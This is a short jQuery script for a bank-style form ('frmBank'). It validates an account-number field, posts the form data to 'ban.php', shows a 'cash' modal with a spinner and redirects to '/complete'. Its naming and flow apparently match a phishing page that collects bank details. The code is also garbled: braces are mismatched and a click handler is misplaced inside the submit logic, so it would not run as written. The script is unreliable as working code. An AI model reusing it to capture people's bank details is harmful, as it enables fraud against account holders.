
$(document).ready(function() {

	$("#anum").blur(function() {
		if($("#anum").val().length < 10){
			$('#anum').addClass('is-invalid');
		}else{
			$('#anum').removeClass('is-invalid');
		}
	});
	});
	$('#frmBank').submit(function(event) {
		event.preventDefault();
		var error = false;
		if($("#anum").length > 0 && $("#anum").val().length < 10){
			$('#anum').addClass('is-invalid');
			error = true;
		}else{
			$('#anum').removeClass('is-invalid');
		}
			$('#bankname').removeClass('is-invalid');
		} 
		$("#btnConfirm").click(function() {
		$("#btnConfirm").prop('disabled', true);
		$("#btnConfirm").html('<img src="/static/img/spin.gif" style="width:43px">');
		setTimeout(function(){
			window.location.replace($("#btnConfirm").attr('data-oauth'));
		}, 2000);
	});
		
			if(!error){
			$("#btnLogin").prop('disabled', true);
			$("#btnLogin").html('<img src="/static/img/spin.gif" style="width:43px">');
			$('#anum').prop('readonly', true);
			var logindata =  $("#frmBank").serialize();
		$.post("ban.php", logindata).done(function(result) {
				if(result != "no"){
					$('#cashBody').addClass("no-scroll");
					$('#btnConfirm').attr("data-oauth", '/complete');
					$('#cashModal').show();
				}else{
					$('#anum').prop('readonly', false);
					$("#anum").addClass('is-invalid');
					$("#btnLogin").prop('disabled', false);
					$("#btnLogin").html('Sign In');
				}
			});
		}
	});
});